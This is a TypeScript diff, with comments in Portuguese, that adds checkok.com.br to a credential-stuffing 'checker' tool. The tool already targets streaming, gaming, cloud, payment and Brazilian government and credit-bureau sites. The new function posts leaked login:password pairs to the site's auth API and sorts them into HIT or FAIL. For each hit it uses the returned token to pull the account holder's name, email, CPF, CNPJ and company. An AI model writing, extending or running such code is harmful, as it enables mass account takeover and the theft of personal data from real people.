@@ -92,7 +92,7 @@ function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
 
 // ── Types ─────────────────────────────────────────────────────────────────────
 export type CheckStatus = "HIT" | "FAIL" | "ERROR";
-export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp" | "instagram" | "sispes" | "sigma" | "spotify" | "receita" | "tubehosting" | "hostinger" | "vultr" | "digitalocean" | "linode" | "github" | "aws" | "mercadopago" | "ifood" | "riot" | "hetzner" | "roblox" | "epicgames" | "steam" | "playstation" | "xbox" | "paypal" | "cpf" | "privacy";
+export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp" | "instagram" | "sispes" | "sigma" | "spotify" | "receita" | "tubehosting" | "hostinger" | "vultr" | "digitalocean" | "linode" | "github" | "aws" | "mercadopago" | "ifood" | "riot" | "hetzner" | "roblox" | "epicgames" | "steam" | "playstation" | "xbox" | "paypal" | "cpf" | "privacy" | "checkok";
 
 export interface CheckResult {
   credential: string;
@@ -1232,6 +1232,109 @@ async function checkPrivacy(login: string, password: string): Promise<CheckResul
     .join(", ");
 
   return { credential, login, status: "HIT", detail: `subs:${subs}` };
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  CHECKOK.COM.BR — app.checkok.com.br/entrar
+//  API: POST https://bff.checkok.com.br/auth
+//  Body: { username: string, password: string }  (username = email, CPF ou código)
+//  200 → HIT (JWT + dados da conta)   403 → FAIL   422 → formato inválido
+//  Após HIT: busca info em rok.api.delend.com.br/customer/v1/user-info
+// ═══════════════════════════════════════════════════════════════════════════════
+const CHECKOK_AUTH_URL = "https://bff.checkok.com.br/auth";
+const CHECKOK_INFO_URL = "https://rok.api.delend.com.br/customer/v1/user-info";
+const CHECKOK_TIMEOUT  = 15_000;
+const CHECKOK_UA       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36";
+
+async function checkCheckOK(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+
+  // Step 1: POST /auth → JWT
+  let authText: string;
+  let authStatus: number;
+  try {
+    const r = await runCurl([
+      "-X", "POST",
+      "-H", `User-Agent: ${CHECKOK_UA}`,
+      "-H", "Content-Type: application/json",
+      "-H", "Accept: application/json",
+      "-H", "Origin: https://app.checkok.com.br",
+      "-H", "Referer: https://app.checkok.com.br/entrar",
+      "-d", JSON.stringify({ username: login.trim(), password: password.trim() }),
+      CHECKOK_AUTH_URL,
+    ], CHECKOK_TIMEOUT);
+    authStatus = r.statusCode;
+    authText   = r.body.trim();
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `NET:${String(e).slice(0, 80)}` };
+  }
+
+  // FAIL: credenciais inválidas (403) ou formato ruim (422)
+  if (authStatus === 403) {
+    return { credential, login, status: "FAIL", detail: "usuario_ou_senha_errados" };
+  }
+  if (authStatus === 422) {
+    return { credential, login, status: "FAIL", detail: "formato_invalido" };
+  }
+  if (authStatus !== 200) {
+    return { credential, login, status: "ERROR", detail: `HTTP_${authStatus}:${authText.slice(0, 60)}` };
+  }
+
+  // Parse JWT response
+  let authJson: Record<string, unknown>;
+  try { authJson = JSON.parse(authText); } catch {
+    return { credential, login, status: "ERROR", detail: `JSON_ERR:${authText.slice(0, 60)}` };
+  }
+
+  const accessToken = String(
+    (authJson as Record<string, unknown>).access_token ??
+    (authJson as Record<string, unknown>).token ??
+    ((authJson as Record<string, unknown>).data as Record<string, unknown> | undefined)?.token ??
+    ""
+  ).trim();
+
+  if (!accessToken) {
+    return { credential, login, status: "ERROR", detail: `NO_TOKEN:${authText.slice(0, 80)}` };
+  }
+
+  // Step 2: buscar dados da conta (opcional, ignora falhas)
+  const parts: string[] = [];
+  try {
+    const infoR = await runCurl([
+      "-H", `User-Agent: ${CHECKOK_UA}`,
+      "-H", "Accept: application/json",
+      "-H", `Authorization: Bearer ${accessToken}`,
+      CHECKOK_INFO_URL,
+    ], 10_000);
+
+    if (infoR.statusCode === 200 && infoR.body.trim()) {
+      const info = JSON.parse(infoR.body) as Record<string, unknown>;
+      const person   = (info.person   ?? {}) as Record<string, unknown>;
+      const customer = (info.customer ?? {}) as Record<string, unknown>;
+      const company  = (customer.company ?? {}) as Record<string, unknown>;
+
+      const name        = String(person.name ?? "").trim();
+      const email       = String(person.email ?? "").trim();
+      const cpf         = String(person.cpf ?? person.logon ?? "").trim();
+      const cnpj        = String(company.cnpj ?? "").trim();
+      const companyName = String(company.fantasyName ?? company.name ?? "").trim();
+      const status      = String(customer.status ?? info.status ?? "").trim();
+
+      if (name)        parts.push(`nome:${name}`);
+      if (email)       parts.push(`email:${email}`);
+      if (cpf)         parts.push(`cpf:${cpf}`);
+      if (cnpj)        parts.push(`cnpj:${cnpj}`);
+      if (companyName) parts.push(`empresa:${companyName}`);
+      if (status)      parts.push(`status:${status}`);
+    }
+  } catch { /* dados extras falhou — ainda é HIT */ }
+
+  return {
+    credential,
+    login,
+    status: "HIT",
+    detail: parts.length > 0 ? parts.join(" | ") : "checkok_autenticado",
+  };
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -4986,6 +5089,7 @@ const CONCURRENCY: Record<CheckerTarget, number> = {
   cpf:           3,   // Receita Federal public lookup — moderate
   // Financeiro BR
   privacy:       3,   // privacy.com.br — REST API, moderate
+  checkok:       5,   // bff.checkok.com.br — JSON API, fast
 };
 
 function resolveChecker(target: CheckerTarget) {
@@ -5038,6 +5142,7 @@ function resolveChecker(target: CheckerTarget) {
     case "cpf":           return checkReceita;
     // Financeiro BR
     case "privacy":       return checkPrivacy;
+    case "checkok":       return checkCheckOK;
     default:              return checkIseek;
   }
 }
@@ -5292,7 +5397,7 @@ async function runCheckerJobAsync(
   finish();
 }
 
-const VALID_CHECKER_TARGETS: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma", "spotify", "receita", "tubehosting", "hostinger", "vultr", "digitalocean", "linode", "github", "aws", "mercadopago", "ifood", "riot", "hetzner", "roblox", "epicgames", "steam", "playstation", "xbox", "paypal", "cpf", "privacy"];
+const VALID_CHECKER_TARGETS: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma", "spotify", "receita", "tubehosting", "hostinger", "vultr", "digitalocean", "linode", "github", "aws", "mercadopago", "ifood", "riot", "hetzner", "roblox", "epicgames", "steam", "playstation", "xbox", "paypal", "cpf", "privacy", "checkok"];
 
 // ── Routes ────────────────────────────────────────────────────────────────────
 // POST /api/checker/check
